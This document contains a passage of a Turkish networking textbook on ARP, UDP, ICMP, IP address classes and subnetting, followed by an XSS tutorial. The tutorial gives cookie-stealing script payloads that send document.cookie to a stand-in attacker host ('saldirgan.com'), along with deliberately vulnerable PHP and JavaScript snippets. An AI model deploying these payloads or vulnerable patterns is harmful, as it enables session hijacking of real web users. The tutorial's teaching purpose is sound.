yollanır. 128.6.4.7 isteği görür ve bir ARP cevabı ile  “128.6.4.7’nin Ethernet adresi 8:0:20:1:56:34” bilgisini istek yapan  istasyona yollar. Bu bilgi, alıcı noktada ARP tablosuna işlenir ve daha  sonra benzer sorgulama yapılmaksızın iletişim mümkün kılınır.  Ağ üzerindeki bazı istasyonlar sürekli ağı dinleyerek ARP sorgularını  alıp kendi tablolarını da güncelleyebilirler.     
 TCP Dışındaki Diğer Protokoller: UDP ve ICMP 
Yukarıda sadece TCP katmanını kullanan bir iletişim türünü açıkladık.  TCP gördüğümüz gibi mesajı segment’lere  bölen ve bunları  birleştiren bir katmandı. Fakat bazı uygulamalarda yollanan mesajlar  tek bir datagram’ın içine girebilecek büyüklüktedirler. Bu cins  mesajlara en güzel örnek adres kontrolüdür (name lookup). Internet  üzerindeki bir bilgisayara ulaşmak için kullanıcılar Internet adresi  yerine o bilgisayarın adını kullanırlar. Bilgisayar sistemi bağlantı  kurmak için çalışmaya başlamadan önce bu ismi Internet adresine  çevirmek  durumundadır. Internet adreslerinin isimlerle  karşılık  tabloları belirli bilgisayarlar üzerinde tutulduğu için kullanıcının sistemi bu bilgisayardan bu adresi sorgulayıp öğrenmek durumundadır.  Bu sorgulama çok kısa bir işlemdir ve tek bir segment  içine sığar.  Dolayısıyla bu iş için TCP katmanının kullanılması gereksizdir. Cevap  paketinin yolda kaybolması durumunda en kötü ihtimalle bu sorgulama  tekrar  yapılır. Bu cins kullanımlar için TCP’nin  alternatifi  protokoller vardır. Böyle amaçlar için en çok kullanılan protokol ise UDP’dir (“User  Datagram Protocol”).  
UDP datagramların belirli sıralara konmasının  gerekli olmadığı uygulamalarda kullanılmak üzere tasarlanmıştır.  TCP’de olduğu gibi UDP’de de bir başlık vardır. Ağ yazılımı bu UDP  başlığını iletilecek bilginin başına koyar. Ardından UDP bu bilgiyi IP  katmanına yollar. IP katmanı kendi başlık bilgisini ve protokol  numarasını yerleştirir (bu sefer protokol numarası alanına UDP’ye ait  değer yazılır). Fakat UDP TCP’nin yaptıklarının hepsini yapmaz. Bilgi  burada datagramlara bölünmez ve yollanan paketlerin kayıdı tutulmaz.  UDP’nin tek sağladığı port numarasıdır. Böylece pek çok program UDP’yi  kullanabilir. Daha az bilgi içerdiği için doğal olarak UDP başlığı TCP  başlığına göre daha kısadır. Başlık, kaynak ve varış port numaraları ile  kontrol toplamını içeren tüm bilgidir.   
Diğer bir  protokol ise  ICMP’dir  (“Internet  Control  Message Protocol”).   ICMP, hata mesajları ve TCP/IP yazılımının  bir takım kendi mesaj trafiği amaçları için kullanılır. Mesela bir  bilgisayara bağlanmak istediğinizde sisteminiz size “host unreachable”  ICMP mesajı ile geri dönebilir. ICMP ağ hakkında bazı bilgileri  toplamak amacı ile de kullanılır. ICMP yapı olarak UDP’ye benzer bir protokoldür.  ICMP de mesajlarını sadece bir datagram içine koyar. Bununla beraber  UDP’ye göre daha basit bir yapıdadır. Başlık bilgisinde port numarası  bulundurmaz.  Bütün  ICMP mesajları  ağ  yazılımının  kendisince  yorumlanır, ICMP mesajının nereye gideceği ile ilgili bir port  numarasına gerek yoktur.  ICMP ‘yi  kullanan en popüler Internet uygulaması PING komutudur. Bu komut yardımı ile Internet kullanıcıları  ulaşmak istedikleri herhangi bir bilgisayarın açık olup olmadığını, hatlardaki sorunları anında test etmek imkanına sahiptirler 
 .
Şu ana kadar gördüğümüz katmanları ve bilgi akışının nasıl olduğunu aşağıdaki şekilde daha açık izleyebiliriz. 
 
 
 	Çizim 12-5 Katmanlar arası bilgi akışı 
 Internet Adresleri   
Daha  önce de gördüğümüz gibi Internet adresleri 32-bitlik  sayılardır ve   noktalarla  ayrılmış  4  octet  (ondalık  sayı   olarak)   olarak gösterilirler.  Örnek  vermek gerekirse,  128.10.2.30  Internet  adresi 10000000 00001010 00000010 00011110 şeklinde 32-bit olarak gösterilir. Temel problem bu bilgisayar ağı adresinin hem bilgisayar ağını ve  hem de  belli  bir  bilgisayarı  tek  başına  gösterebilmesidir.    
Internet’te değişik büyüklükte  bilgisayar ağlarının bulunmasından dolayı  Internet  adres yapısının tüm bu ağların adres sorununu çözmesi gerekmektedir. Tüm  bu ihtiyaçları  karşılayabilmek amacı ile Internet  tasarlanırken  32bitlik  adres  yapısı seçilmiş ve bilgisayar ağlarının  çoğunun  küçük ağlar  olacağı  varsayımı ile yola çıkılmıştır.   
32-bit Internet adresleri, 'Ağ Bilgi Merkezi (NIC) Internet Kayıt Kabul' tarafından yönetilmektedir. Yerel yönetilen bir ağ uluslararası platformda daha büyük bir ağa bağlanmadığında adres rastgele olabilir. Fakat, bu tip adresler ileride Internet'e bağlanılması durumunda  sorun çıkartabileceği için önerilmemektedir. Ağ yöneticisi bir diğer IP-tabanlı sisteme, örneğin NSFNET'e bağlanmak istediğinde tüm yerel adreslerin  'Uluslararası Internet Kayıt Kabul' tarafından belirlenmesi zorunludur. 
Değişik  büyüklükteki ağları adreslemek amacı ile 3 sınıf adres kullanılmaktadır:  
 
A	Sınıfı adresler: İlk byte 0 'la 126 arasında değişir. İlk byte ağ numarasıdır. Gerisi  bilgisayarların adresini belirler. Bu tip adresleme, herbiri 16,777,216 bilgisayardan oluşan 126  ağın adreslenmesine izin verir. 
 
B	Sınıfı adresler: İlk byte 128 'le 191 arasında değişir. İlk iki byte ağ numarasıdır. Gerisi bilgisayar adresini belirler. Bu tip adresleme, herbiri 65,536 bilgisayardan oluşan 16,384  ağın adreslenmesine izin verir. 
 
C	Sınıfı adresler: İlk byte 192 ile 223 arasında değişir. İlk üç byte ağ numarasıdır. Gerisi  bilgisayarların adresini belirler. Bu tip adresleme, herbiri 254 bilgisayardan oluşan 2,000,000 ağın adreslenmesine izin verir. 
 
A Sınıfı Adresler 
0 1  	 	 	8 	 	16 	 	24 	 	31 
0 	 Ağ Numarası     	   Bilgisayar  Numarası 
 
 
B Sınıfı Adresler 
0 	1 	16 	31 
1 	0 	   Ağ Numarası      	   Bilgisayar Numarası 
 
 
C Sınıfı Adresler 
0 	1 2 	24 	31  
1 	1 	0 	  Ağ Numarası   	Bilgisayar Num. 
 
127  ile başlayan  adresler Internet tarafından özel amaçlarla (“localhost”  tanımı için) kullanılmaktadır. 
223'ün üzerindeki adresler gelecekte kullanılmak üzere D-sınıfı ve  E-sınıfı adresler olarak ayrılmış olarak tutulmaktadır.  
A sınıfı adresler, NSFNET, MILNET gibi büyük ağlarda kullanılır. C sınıfı adresler, genellikle üniversite yerleşkelerinde kurulu yerel ağlarla, ufak devlet kuruluşlarında kullanılır. NIC sadece ağ numaralarını yönetir. Bölgede olması beklenen  bilgisayar  sayısına göre A, B veya C sınıfı adresleme seçilir. Bir bölgeye ağ numarası verildikten sonra  bilgisayarların nasıl adresleneceğini bölge yönetimi belirler.   IP adres alanı özellikle son yıllarda artan kullanım talebi sonucunda hızla tükenmeye başlamıştır. Bu nedenle yapılan IP adres taleplerinin gerçekçi olmasının sağlanması için gerekli kontroller yapılmaktadır.  
 Alt Ağlar (Subnet) 
Subnet ya da alt ağ kavramı, kurumların ellerindeki Internet adres yapısından daha verimli yararlanmaları için geliştirilen bir adresleme yöntemidir. Pek  çok büyük organizasyon kendilerine verilen Internet  numaralarını alt ağlara  bölerek kullanmayı daha uygun  bulmaktadırlar.  “Subnet” kavramı  aslında  'Bilgisayar numarası' alanındaki bazı  bitlerin  'Ağ numarası' olarak kullanılmasından ortaya çıkmıştır. Böylece, elimizdeki bir adres ile  tanımlanabilecek bilgisayar sayısı düşürülerek,  tanımlanabilecek ağ sayısını yükseltmek mümkün olmaktadır.   
Nasıl bir alt ağ  yapısının kullanılacağı  kurumların ağ alt yapılarına ve topolojilerine  bağımlı olarak  değişmektedir. Alt ağ kullanılması  durumunda  bilgisayarların adreslenmesi  kontrolü  merkezi olmaktan çıkmakta  ve  yetki  dağıtımı yapılmaktadır.  Alt ağ  yapısının   kullanılması   yanlızca  o adresi kullanan kurumun    kendisini ilgilendirmekte ve  bunun  kurum dışına hiçbir etkisi de bulunmamaktadır. Herhangi bir dış kullanıcı altağ kullanılan bir  ağa ulaşmak  istediğinde o ağda kullanılan altağ yönteminden haberdar  olmadan istediği  noktaya ulaşabilir. Kurum sadece kendi  içinde  kullandığı geçiş  yolları  ya da yönlendiriciler üzerinde  hangi  alt ağa  nasıl gidilebileceği tanımlamalarını yapmak durumundadır. 
Bir  Internet ağını alt ağlara bölmek, alt ağ maskesi denilen  bir  IP adresi kullanılarak yapılmaktadır. Eğer maske adresteki adres bit'i  1 ise  o  alan  ağ adresini göstermektedir, adres bit'i  0 ise o alan  adresin bilgisayar  numarası  alanını göstermektedir.  Konuyu  daha  anlaşılır kılmak için bir örnek üzerinde inceleyelim:  
ODTÜ kampüsü  için bir B-sınıfı adres olan 144.122.0.0 kayıtlı olarak kullanılmaktadır. Bu adres ile  ODTÜ 65.536 adet bilgisayarı adresleyebilme yeteneğine  sahiptir. Standart  B-sınıfı  bir adresin maske adresi  255.255.0.0  olmaktadır. Ancak  bu adres alındıktan sonra ODTÜ'nün teknik ve idari  yapısı  göz önünde tutularak farklı alt ağ yapısı uygulanmasına karar verilmiştir. Adres içindeki üçüncü octet'inde ağ alanı 
adreslemesinde  kullanılması ile ODTÜ'de 254 adede kadar farklı bilgisayar ağının  tanımlanabilmesi mümkün  olmuştur. Maske adres olarak  255.255.255.0  
kullanılmaktadır. İlk  iki  octet (255.255) B-sınıfı adresi, üçüncü octet  (255)  alt ağ adresini  tanımlamakta,  dördüncü octet (0) ise  o  alt ağ  üzerindeki bilgisayarı tanımlamaktadır.  
 
144.122.0.0 ODTÜ için  kayıtlı adres  
 
255.255.0.0  Standart B-Sınıfı adres maskesi 	Bir ağ, 65536 bilgisayar 
255.255.255.0 Yeni maske 	254 ağ, her ağda 254 bilgisayar 
 
ODTÜ de uygulanan adres maskesi ile alt ağlara   bölünmüş  olan ağ   adresleri   merkezi   olarak   bölümlere dağıtılmakta  ve  her  bir  alt ağ  kendi  yerel  ağı  üzerindeki   ağ parçasında   254  taneye  kadar  bilgisayarını   adresleyebilmektedir. Böylece tek bir merkezden tüm üniversitedeki makinaların IP adreslerinin tanımlanması gibi bir  sorun  ortadan kaldırılmış ve adresleme  yetkisi  ayrı  birimlere verilerek  onlara  kendi  içlerinde  esnek  hareket  etme   kabiliyeti tanınmıştır. Bir örnek verecek olursak: Bilgisayar   Mühendisliği   bölümü  için  71 alt ağı ayrılmış ve 144.122.71.0  ağ  adresi  kullanımlarına ayrılmıştır. Böylece,  bölüm içinde 144.122.71.1  den 144.122.71.254 'e  kadar  olan  adreslerin dağıtımı   yetkisi  bölümün  kendisine  bırakılmıştır.  Aynı   şekilde Matematik bölümü için 144.122.36.0, Fizik bölümü için 144.122.30.0  ağ adresi ayrılmıştır.    
C-sınıfı  bir adres  üzerinde  yapılan  bir  alt ağ  için  örnek   verecek olursak:  
 
Elinde C-sınıfı 193.140.65.0  adres olan bir kurum  subnet adresi olarak  
255.255.255.192  kullandığında  
 
 	193.140.65.0 	11000001 10001100 01000001 00000000 
 	255.255.255.192 	11111111 11111111 11111111 11000000 
 
 	    Ağ numarası alanı
 	Bilgisayar numarası 
 
elindeki bu adresi dört  farklı  parçaya bölebilir. Değişik alt ağ maskeleri ile nasıl sonuçlar edinilebileceği  ile ilgili örnek bir tablo verecek olursak :  
 
IP adres 
 	Maske 	Açıklama  
128.66.12.1  	255.25.255.0 	128.66.12  subneti  üzerindeki   
 		1.  bilgisayar   
130.97.16.132 	255.255.255.192 	130.97.16.128 subneti üzerindeki 
 		 4. bilgisayar.  
192.178.16.66 	255.255.255.192 	192.178.16.64 subneti  üzerindeki  
 		2. bilgisayar  
132.90.132.5 	255.255.240.0 	132.90.128 subnetindeki 4.5 inci  
 		bilgisayar. 
18.20.16.91 	255.255.0.0 	18.20.0.0 subnetindeki 16.91 inci bilgisayar  
 
 Özel Adresler 
Internet  adreslemesinde  0  ve 255'in özel bir  kullanımı  vardır.  0 adresi,  Internet üzerinde kendi adresini bilmeyen bilgisayarlar  için (Belirli   bazı   durumlarda  bir  makinanın   kendisinin bilgisayar  numarasını  bilip hangi ağ üzerinde olduğunu bilmemesi gibi bir  durum olabilmektedir)    veya   bir   ağın kendisini    tanımlamak için kullanılmaktadır (144.122.0.0 gibi). 255  adresi genel duyuru  "broadcast" amacı ile  kullanılmaktadır.  Bir  ağ üzerindeki  tüm istasyonların duymasını istediğiniz bir  mesaj  genel duyuru "broadcast"  mesajıdır.  Duyuru  mesajı  genelde  bir  istasyon  hangi istasyon  ile  konuşacağını  bilemediği  bir  durumda  kullanılan  bir mesajlaşma  yöntemidir. Örneğin ulaşmak istediğiniz  bir  bilgisayarın adı  elinizde  bulunabilir ama onun IP adresine ihtiyaç  duydunuz,  bu çevirme  işini  yapan en yakın "name server" makinasının  adresini  de bilmiyorsunuz.  Böyle bir durumda bu isteğinizi yayın mesajı yolu  ile yollayabilirsiniz.  Bazı durumlarda birden fazla sisteme bir  bilginin gönderilmesi  gerekebilir böyle bir durumda her bilgisayara ayrı  ayrı mesaj  gönderilmesi  yerine tek bir yayın mesajı yollanması  çok  daha kullanışlı bir yoldur. Yayın  mesajı  yollamak  için  gidecek  olan  mesajın  IP  numarasının bilgisayar adresi alanına 255 verilir. Örneğin 144.122.99 ağı üzerinde  yer  alan  bir bilgisayar yayın mesajı  yollamak  için  144.122.99.255 adresini  kullanır.  Yayın mesajı yollanması birazda  kullanılan  ağın fiziksel katmanının özelliklerine bağlıdır. Mesela bir Ethernet ağında yayın mümkün iken noktadan noktaya (point-to-point) hatlarda bu mümkün olmamaktadır.  
Bazı eski sürüm TCP/IP protokolüne sahip bilgisayarlarda yayın  adresi olarak  255  yerine  0 kullanılabilmektedir.  Ayrıca  yine  bazı  eski sürümler alt ağ  kavramına hiç sahip olmayabilmektedir.  
Yukarıda  da  belirttiğimiz gibi 0 ve 255'in  özel  kullanım  alanları olduğu    için  ağa bağlı   bilgisayarlara   bu   adresler kesinlikle verilmemelidir. Ayrıca adresler asla 0 ve 127 ile ve 223'ün  üzerindeki  bir sayı ile başlamamalıdır. 
 



This pdf was created by Musa ŞANA and you can access the pdf originally from musana.net.
Date: October 17, 2016  -  Contact: musa.sana@hotmail.com
 
XSS (Cross Side Scripting, CSS)
XSS (Siteler arası betik çalıştırma) zafiyeti, saldırganın html, css, javascript ile hazırlamış olduğu zararlı kod parçalarının hedef kullanıcının(kurbanın) browserında izinsiz olarak çalıştırmasına imkan tanıyan bir web uygulama güvenliği zafiyetidir. Başka bir deyişle; bir uygulamada bulunan XSS zafiyeti saldırgana, hedef kullanıcının tarayıcısında zararlı kod çalıştırma imkanı tanır. Bu imkan neticesinde saldırgan, hedef kullanıcının oturum bilgilerini, ekran görüntüsünü, tuş girişleri gibi bilgileri alabilir, uygulama içeriğinin manüpüle edebilir. Bu zafiyet istismar edilirken bazen kurbanın insiyatifine bağlı olurken(Reflected ve DOM based türlerinde) bazen de saldırgan, kurban ile muhattap olmadan da zafiyetten etkilenmesini sağlayabilir(persistent türünde).
XSS ile neler yapılabilir ?
a) Html ile;
●	Html kodlar kullanılarak fake inputlar yerleştirilip veri çalınabilir.
●	Iframe etiketi kullanılarak başka sayfalar çağrılıp veri alınabilir.
●	Html meta refresh ile sayfa yönlendirelebilir.
●	Özetle içeriği html ve css kullanarak istediğiniz gibi manipüle edebilirsiniz.
Asıl saldırı vektörleri javascript kodu kullanarak gerçekleştirilmektedir. Çünkü javascript ile daha dinamik işlemler yapabilmektedir.
b) JavaScript ile;
●	En bilinen ve yaygın olan document.cookie ile kullanıcıların oturum bilgilerini almak.(Session Hijacking)
●	Ajax ile kullanıcı bilgilerinin alınıp uzak sunucudaki bir dosyada kayıt edilmesi.
●	addEventListener fonksiyonu ile hedef kullanıcının bütün klavye, mouse, form etkileşimleri vs kayıt altına alınarak saldırganın kontrolunda olan bir uzak sunucuya gönderilebilir.
●	Bulunan sistemlere bağlı olarak (camera hizmeti olan sistemlerde) kişinin kamerasından anlık ekran görüntüsü alınabilir.
●	XMLHttpRequest nesnesi ile istenilen bir adrese istek yapılabilir.
●	DOM sayesinde JS ile sayfa içeriği rahatlıkla değiştirilebilir. Örneğin bir form tagının action niteliğinin değeri değiştirilip kullanıcının form inputlarına girdiği (username,password, kredi kartı vs) hasas bilgileri alınabilir.(Phishing) ● Botnet ağı kurulabilir.
●	Kısaca javascript kodu ile yapabileceğiniz her türlü işlemleri yapabilirsiniz. Bu artık üretkenliğinize kalan bir durumdur.
    Beef framework tarayıcı odaklı bir penetrasyon test aracıdır. Bünyesinde barındırdığı bir çok exploit ile tarayıcıya yönelik ciddi saldırılar gerçekleştirebilir.     XSS saldırısı da client side bir saldırı olduğu için bu zafiyet istismar edilirken bazen bu tool kullanılır. Çünkü saldırgana işi daha fonksiyonel, otomatize ve rahat bir     şekilde kontrol edebilme avantajı sağlamaktadır.
Zafiyet neyden kaynaklanmakta?
XSS saldırıların en temel nedeni kullanıcılardan alınan inputların hiçbir filtrelemeden geçmeden işleme tabi tutulmasıdır.Bu inputlar;
●	kullanıcıdan form elemanları aracılığıyla alınan bir değer olabilir(search, login, register etc.),
●	get metoduyla gönderilen bir değer olabilir,
●	http headerlerı ile gönderilen bir değer olabilir,
●	cookie, session id değerleri olabilir,
●	bir file upload kısmında dosyanın kendisi veya dosyanın adı olabilir.
●	...
Özetle; kullanıcıdan sunucuya giden herhangi bir verinin bir filtreleme işlemine tabi tutulmadan doğrudan kullanılmasından kaynaklanır. Karşıdaki her zaman sıradan bir son kullanıcı olmayabilir. Bu hiçbir zaman göz ardı edilmemelidir. Geliştirilen her uygulama için kullanıcıları saldırgan olarak düşünüp uygulamayı o yönde geliştirmek gerekir. Basit bir kod;
<?php echo $_GET['cmd']; ?>
En kısa anlatımla yukarıdaki kod id parametresinin aldığı değeri ekrana basıyor. Ne güzel :) Peki son kullanıcı sıradan değer değilde; html, javascript gibi istemci tarafından çalışan dillerin keywordlerini(veya server side kısmında çalışan diller için özel anlamı olan karakterleri) kullanınca ne olacak? Hiçbir filtreleme işlemi yapılmadığı için tabi ki de paşa paşa çalışacaktır. Çünkü ilgili değerler kaynak kodun syntaxını bozmadığı için düzgün bir şekilde çalışacaktır. Yani kullanıcı cmd parametresine <b>merhaba</b> değerini yazdığında ekranda bold olarak merhaba yazacaktır. Bu bizim için şunu ifade eder. Html ve JS kullanarak istediğimiz gibi at koşturabiliriz. Ayrıca yukarıdaki kod sadece xss zafiyetine yol açmamaktadır. Eğer cmd parametresindeki değer veritabanına kayıt edilip tekrar yazdırılırsa bu sql injection zafiyetine de sebeb verecektir. İşte kullanıcıdan alınan en ufak bir verinin kontrolu bu kadar önemli!
XSS Türleri
XSS saldırısında amaç; hedef kullanıcının tarayıcısında bir şekilde zararlı kod çalışmaktır. Bu amaca ulaşmak için bir kaç farklı yöntem bulunmaktadır. Bu farklılıktan dolayı xss saldırıları şimdilik 3 türe ayrılmıştır. Bizde bu sınıflandırmaya sadık kalarak konuyu anlatacağız.
Reflected XSS
Reflected XSS saldırısında; kurbanın, hedef siteye istek yapması için kullanacağı bağlantıda(link) zararlı kod parçası bulundurmasıdır. İstek yapılırken bu zararlı kod ifa edilir ve dönen cevap saldırganın saldırganın kontrolunde olan bir uzak sunucuya gönderilir. Burada önemli olan nokta; zafiyetin istismar edilmesi tamamen kullanıcının insiyatifine kalan bir durumdur. Yani kullanıcı zararlı kod içeren bağlantıya tıklamadığı sürece zafiyetten etkilenmeyecektir. Ayrıca diğer türlerine oranla en çok karşılaşılan xss saldırı türüdür.
GET metoduyla alınan bir q parametresinde reflected xss zafiyeti olan bir sistem tassavur edelim. Yani şöyle;
http://zafiyetlisite.com?q=
Saldırgan böyle bir senaryo karşısında aşağıdakine benzer bir payload kullanacaktır.
<script>document.getElementById("sazan").src =
"http://saldirgan.com?snif.php?q="+document.cookie;</script>
Kodun meali;
Yukarıdaki zararlı kod; sayfada id seçicisinin adı sazan olan bir elementi seçiyor(bu elementin <img
/> olduğunu kabul edelim). Ve src niteliğine, saldırganın kontrolunda olan bir hostun adresini atıyor. Bu hostta bulunan sniff.php dosyasına, q paremetresinde kurbanın cookie değeri olacak şekilde get metoduyla bir istekte bulunuyor. Saldırgan da gelen bu isteği kayıt altına alıyor ve böylece hedef kullanıcının oturum bilgisini kendi oturum bilgisi ile değiştirerek giriş yapıyor.(Örnek senaryoda bunun nasıl yapıldığını göreceğiz.)
Yani sonuç olarak saldırgan aşağıda bulunan bağlantıyı bir şekilde kurbana tıklatmak zorundadır. Daha doğru bir şekilde ifade edersek; saldırganın, kurbana aşağıdaki bağlantıya istek yapmasını sağlaması gerekir. İlla tıklaması gerekmez. Kendi kontrolunda olan başka bir site üzerinde bulunan src niteliğine sahip bir elemente aşağıdaki bağlantıyı gömmesi yeterlidir. Kurbanın ruhu bile duymaz. Daha derin düşününce aklıma daha kötü şeyler gelmiyor değil. Neyse :)
http://zafiyetlisite.com?q=<script>document.getElementById("sazan").src = "http://saldirgan.com?snif.php?q="+document.cookie</script>
Ancak... we have a bit of problem. Kim böyle bir bağlantıya tıklar? Sazan olmayan biri olursa böyle bir bağlantıdan işkilenip tıklamayacaktır. Bu tür durumlarda saldırgan link kısaltma servislerini kullanmaktadır. O yüzden her gördüğünüze tıklamayın :) Bazı eklentiler sayesinde kısaltılan linklere tıklamadan da açık halini de görmek mümkündür. Aklınızda olsun.
Öte taraftan saldırganın kullanacağı payloadlar sadece bununla sınırlı değil. Örneğin aşağıdaki gibi bir payload ile de saldırgan amacına rahatlıkla ulaşabilir.
http://zafiyetlisite.com?q=<script>document.location.href("http://saldirgan.com?sni
f.php?q="+document.cookie)</script>
Saldırgan, kurbana yukarıdaki bağlantıya istek yapmayı başardığında document.location.href fonksiyonundan dolayı kullanıcı saldırganın belirtiği adrese yönlendirilecektir bu da saldırganın istemediği bir durumdur. Saldırılar daha çok kurbana sezdirmeden yapılmaktır. Bu nedenle ilk payloadımız veya ona benzer payloadlar daha çok tercih edilmektedir. Dediğim gibi payloadlar bunlardan ibaret değil saldırganın amacına ulaşması için birçok farklı payload çeşidi vardır. Ancak hepsinin tek bir amacı vardır;
Önemli olan kurbana ilgili requesti yapmayı başarmaktır. Ne şekilde olacağının bir önemi yok, ama kurbana sezdirmeden yapılması tabi ki daha makbuldur.
Son olarak bu anlatıklarımızı örnek bir diyagram üzerinde görürsek konunun tam anlaşılmasına faydası olacaktır.
 
1.	Saldırgan site üzerinde bulduğu reflected xss zafiyetini kullanarak başka kullanıcıların oturum bilgisini çalmak için zararlı linki kurbana gönderir.
2.	Kurban bağlantıya tıklar ve ilgili siteye gider.
3.	Ama aynı zamanda bağlantıda bulunan zararlı kod da ifa edilir ve web sitesinden kurbanın cookie bilgileri istenir ve dönen cevap kurbana iletilir.
4.	Gelen cevapta kurbanın cookie bilgileri bulunur ve zararlı olan js kodu cookie bilgilerini saldırganın serverına gönderecek olan kodu işler.
DOM Based XSS
type-0 xss olarak da bilinen bu xss türü, client side olup diğer iki türün(persistent ve reflected) aksine çok farklı bir mekanizmaya sahiptir. DOM tabanlı xss zafiyetine geçmeden önce basitçe DOM yapısının ne olduğundan bahsetmemizde fayda var.
DOM (Document Object Model), w3c organizasyonu tarafından tanımlanan bir standartır. Temel amacı bir belge içerisindeki yapıyı object-oriented paradigmasına dönüştürmektir. Sadece html yapısına özgü olmamakla beraber herhangi bir belge de dom yapısına sahip olabilir. En çok duyduklanlar arasında XML ve HTML dom yapısı gelmektedir. Biz ise burada HTML DOM yapısını ele alacağız. HTML DOM, platformdan bağımsız olarak diğer dillerin html ile etkileşime geçerek bilgi alışverişinde bulunabilmesine imkan tanıyan bir arabirimdir. Bu yapıya göre bir html belgesindeki bütün etiketler (hiyerarşik bir düzene göre) nesne olarak kabul edilip bu nesnelere erişilerek içeriği veya özellikleri değiştirilebilmektedir.
Başta söylediğimiz üzere yapısı gereği diğer iki türden farklıdır. Çünkü persistent ve reflected xss zafiyetleri sunucu taraflı filtrelemeler ile engellenebilirken DOM tabanlı xss de böyle bir durum söz konusu değildir. Bunun nedeni ise; bazı sorguların sonucuya iletilmeden kullanıcının browserında çalışması veya sunucudan cevap döndükten sonra sorgunun ifa edilmesiden kaynaklanmaktadır.
Örneğin, url'de bulunan # (diez, hash,fragment) karakterinden sonraki ifade sunucuya iletilmez. Yani # den sonraki ifadeler için herhangi bir http trafiği oluşmaz. # ifadesi sayfa içerisinde bir bölüme geçiş yapmanın yanında farklı amaçlar içinde kullanılmaktadır. Size verebileceğim en iyi örnek şu an bu sayfanın sol üst tarafında bulunan içerikler kısmı olacaktır :) İlgili bağlantıya tıkladığınızda sayfa içerisinde ilgili bölüme gelmektesiniz ve url yapısında da # ifadesinden sonra geldiğiniz kısmın id değeri yazmaktadır. Peki # karakterinden sonraki kısmın sunucuya iletilmemesi iyi bir olay mı?
Bir saldırganın gözünden bakarsak kesinlikle çok iyi bir olay. Url'deki ifadenin bir kısmının sunucuya iletilmeden tarayıcı tarafından icra edilmesi tam olarak şu anlama gelmektedir: Sunucu tarafındaki alınan hiçbir güvenlik işe yaramayacaktır. Çünkü zararlı kod # ifadesinden sonra yazıldığı için sunucuya iletilmiyor ancak sunucudan kullanıcıya cevap döndükten sonra # ifadesinden sonraki kod tarayıcı tarafından ifa edilecek ve zafiyet bu şekilde istismar edilmiş olacak.
var x = document.location.hash.split('#')[1]; document.write(x);
Yukarıdaki JS kodu; Url içerisinde bulunan # karakter(ler)ini referans alarak url adresini parçalar ve oluşan değerleri bir dizi içerisinde tutar. Oluşan dizideki 2. elemanı(veya indisi 1 olan elemanı) x değişkenine atar ve bu değişkeni document.write ile ekrana basar.
Eğer geliştirici web uygulamasının bir yerlerinde böyle bir kod kullanmış ise saldırganın bunu keşfetmesi durumunda geliştireceği payload gayet basittir. http://site.com#<script>alert(1)</script>
Saldırgan yukarıdaki payloadı kullanarak kurbana istek yapmaya çalıştığında # karakterinden sonraki değer sunucuya iletilmeyeceğinden, sunucu tarafında alınmış çok ciddi filtreleme, sanitize, encoding, white list vs. işlemleri olsa bile bu durum dom-based xss zafiyetini engelleyemeyecektir. Çünkü sunucuya # karakterinden sonraki ifade gönderilmeyecektir. # karakterinden önceki istek sunucuya yapılır ve sunucudan cevap döndükten sonra # karakterinden sonraki kod kullanıcının browserı tarafından ifa edilir. Bu saldırı vektörü client side bir yapıya sahip olduğundan dolayı browser geliştiricileri bu durumu çözmek için tarayıcının kendi içinde güvenliği sağlamaya çalışmışlardır. Yukarıdaki js kodunu çalıştırıp payloadı denediğinizde alert alamayabilirsiniz. Çünkü Chrome, XSS Auditor diye adlandırdığı, kullanıcıyı xss saldırılarından korumak için bir güvenlik sağlamış, firefox ise encoding işlemine tabi tutacağından payload çalışmayacaktır.
Chrome bir çok xss payloadını güvenlik nedeniyle engellemektedir. Bu yazının ikinci ana bölümünde anlatığım testleri denerken chrome kullanırsanız büyük ihtimalle örneklerin çoğunda alert alamayacaksınız.(Firefox kullanın.) Bu nedenle xss zafiyeti ararken chromeda (veya başka bir tarayıcıda olabilir) hata almamanız xss zafiyetinin olmadığı anlamına gelmemektedir. Çünkü her tarayıcı bazı standartlara uymayıp kendi standartlarını oluşturmaya/dayatmaya çalıştıklarından dolayı aynı kodlar farklı tarayıcılarda farklı sonuçlar verebilmektedir. Tarayıcıdan tarayıcıya farklı sonuçlar almanız sizi şaşırtmasın yani. Özellikle front-end geliştiricileri bu durumu çok iyi bilmektedir. Buna binaen xss zafiyeti ararken aynı payloadı farklı tarayıcılarda denemekte fayda var.
 
Öte taraftan dom based xss client side bir saldırı olduğundan diğer tarayıcılar gibi firefoxda kullanıcılarının bu zafiyetten etkillenmeleri için encoding işlemi yapmaktadır. Mesela firefox # karakterinden sonraki ifadeyi encoding işleminden geçirdiği için yukarıdaki payloadımız firefoxda da çalışmayacaktadır. Firefox, diğer xss türlerinde chrome gibi herhangi bir engelleme yapmamaktadır. Chrome veya firefox'un eski sürümlerinde bu temel payloadlar çalışmaktadır. Kim güncel olmayan bir tarayıcı kullanır ki diyebilirsiniz. Bunlar temel payloadlar olduğu için sezgisel olarak chrome engelleyebiliyor ancak chrome'un yakalayamadığı çok complex payloadlar bulunmaktadır. Ayrıca chrome da bulunan XSS Auditor bypass edilebilmektir.
Bu yazının yayınlanması yeterince geciktiğinden XSS Auditor'un nasıl çalıştığını ve nasıl bypass edileceğini başka bir yazıda ele alacağım İnşallah.
 
Yukarıdaki resim bize bazı noktalarda önemli bilgiler vermketedir. Öncellikle sayfanın kaynak koduna baktığınızda payloadımızın görünmediğini göreceksiniz. DOM based xss zafiyetinde payload sayfanın kaynak kodunda görünmez. Ancak geliştirici araçlarından bakarsanız görebilirsiniz. Yukarıda görmüş olduğunuz üzere geliştirici araçlarından baktığımızda kırmızı olarak görülen bölümde, xss.html dosyasının 12. satırında yer alan kodun tehlike arz etmesinden dolayı XSS Auditorun scriptte yer alan ilgili kodu çalıştırmadığını söylüyor. Google xss zafiyetinin sebeb olacağı tehlikeleri göz ardı etmediğinden kullanıcılarını bu tehtitten korumak için böyle bir güvenlik önlemi almış. Bizi bizden daha çok düşünüyorlar. Eksik olmasınlar(!) Kullanırken dikkat edilmediği taktirde dom-based xss zafiyetine sebeb veren js fonksiyonu yukarıda verdiğimiz document.location.hash.split den ibaret değildir. Aşağıdaki js kodu da pek ala dom-based xss zafiyetine sebeb olmaktadır.
  var name = location.hash.slice(1);   document.write("Hello "+name);
